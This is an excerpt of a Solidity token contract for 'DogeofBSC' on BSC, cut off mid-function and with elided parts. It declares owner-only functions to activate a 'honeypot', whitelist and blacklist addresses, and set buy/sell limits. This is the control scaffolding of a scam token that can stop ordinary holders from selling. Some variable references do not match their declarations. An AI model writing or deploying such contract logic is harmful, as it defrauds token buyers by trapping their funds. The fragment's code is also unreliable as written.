...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "DogeofBSC";
    string public _symbol= "bscdoge";
    bool balances1 = true;
    bool amount1 = true;
    ...
    function Buy_Sell_Limit_Activation(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function Buy_sell_Limit(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    
    function HONEYPOT_ACTIVATION(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
    function HONEYPOT_WHITELIST(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function HONEYPOT_BLACKLIST(address account) onlyOwner public {
